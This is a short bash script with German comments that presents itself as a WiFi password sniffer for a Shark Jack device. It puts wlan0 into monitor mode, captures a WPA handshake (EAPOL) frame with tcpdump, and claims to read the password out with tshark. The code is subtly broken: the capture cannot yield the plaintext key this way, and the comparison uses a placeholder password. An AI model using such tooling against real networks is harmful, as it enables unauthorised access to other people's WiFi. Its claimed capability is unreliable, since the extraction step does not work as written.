
#!/bin/bash

# WLAN-Passwort-Sniffing-Skript für Sharkjack

# Warten, bis eine Netzwerkverbindung besteht
while ! ping -c 1 google.com &>/dev/null; do
    sleep 1
done

# WLAN-Passwort-Sniffing starten
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
tcpdump -i wlan0 -w /root/password.pcap -c 1 -vvv "ether proto 0x888e"

# Überprüfen, ob das Passwort gefunden wurde
if [ -e /root/password.pcap ]; then
    # Passwort gefunden, LED grün blinken lassen
    led green blink

    # Passwort überprüfen
    PASSWORD=$(tshark -r /root/password.pcap -T fields -e wlan.wpa_psk | head -1)
    if [ "$PASSWORD" == "your_wifi_password" ]; then
        # Passwort korrekt, LED grün leuchten lassen
        led green on
    else
        # Passwort falsch, LED rot leuchten lassen und Skript neu starten
        led red on
        sleep 10
        reboot
    fi
else
    # Passwort nicht gefunden, LED rot blinken lassen und Skript neu starten
    led red blink
    sleep 900
    reboot
fi
